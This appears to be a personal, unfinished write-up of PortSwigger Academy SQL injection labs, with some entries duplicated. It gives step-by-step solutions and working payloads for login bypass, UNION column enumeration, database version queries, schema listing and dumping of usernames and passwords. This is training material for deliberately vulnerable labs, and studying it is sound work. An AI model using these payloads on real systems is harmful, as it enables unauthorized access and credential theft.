---
title: "PortSwigger Labs: SQL Injection"
tags:
  - portSwiggerAcademy
  - serverSide
  - web
  - writeUp
---
[Link To Lesson](https://portswigger.net/web-security/sql-injection)
**Number Of Labs:** 30

---
### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#apprentice

[Link to Lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
#### Instructions
This lab contains a [[SQL injection]] vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+OR+1=1--`
3. Submit the request, and verify that the response now contains one or more unreleased products.

---
### Lab: SQL injection vulnerability allowing login bypass

[Link to Lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

#apprentice
#### Instructions
This lab contains a [[SQL injection]] vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
#### Solution
1. Use Burp Suite to intercept and modify the login request.
2. Modify the `username` parameter, giving it the value: `administrator'--`
---
### Lab: SQL injection vulnerability allowing login bypass
#apprentice

[Link to Lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
#### Instructions
This lab contains a [[SQL injection]] vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
#### Solution
1. Use Burp Suite to intercept and modify the login request.
2. Modify the `username` parameter, giving it the value: `administrator'--`
---

### LAB: SQL injection UNION attack, determining the number of columns returned by the query
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

#### Instructions
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:
    `'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
---

### Lab: SQL injection UNION attack, finding a column containing text
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

#### Instructions
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the `category` parameter:
    
    `'+UNION+SELECT+NULL,NULL,NULL--`
3. Try replacing each null with the random value provided by the lab, for example:
    
    `'+UNION+SELECT+'abcdef',NULL,NULL--`
4. If an error occurs, move on to the next null and try that instead.

---
### Lab: SQL injection UNION attack, retrieving data from other tables
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

#### Instructions
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

#### Solution
1. 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the contents of the `users` table:
    
    `'+UNION+SELECT+username,+password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.

---
###  Lab: SQL injection attack, querying the database type and version on Oracle
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

#### Instructions
  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'+FROM+dual--`
3. Use the following payload to display the database version:
    
    `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
---
###  Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

#### Instructions
  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'#`
3. Use the following payload to display the database version:
    
    `'+UNION+SELECT+@@version,+NULL#`
---
###  Lab: SQL injection attack, listing the database contents on non-Oracle databases
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

#### Instructions
  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.
---
###  Lab: SQL injection attack, listing the database contents on Oracle
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

#### Instructions
  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

#### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'+FROM+dual--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
8. Find the password for the `administrator` user, and use it to log in.
---
###  Lab: SQL injection UNION attack, retrieving multiple values in a single column
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

#### Instructions
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### Solution
1. 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+NULL,'abc'--`
3. Use the following payload to retrieve the contents of the `users` table:
    
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.
---
###  Lab: SQL injection UNION attack, retrieving multiple values in a single column
#practitioner

[Link To Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

#### Instructions
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### Solution
1. 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+NULL,'abc'--`
3. Use the following payload to retrieve the contents of the `users` table:
    
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.
---

### Blind SQL Injections To Be Done
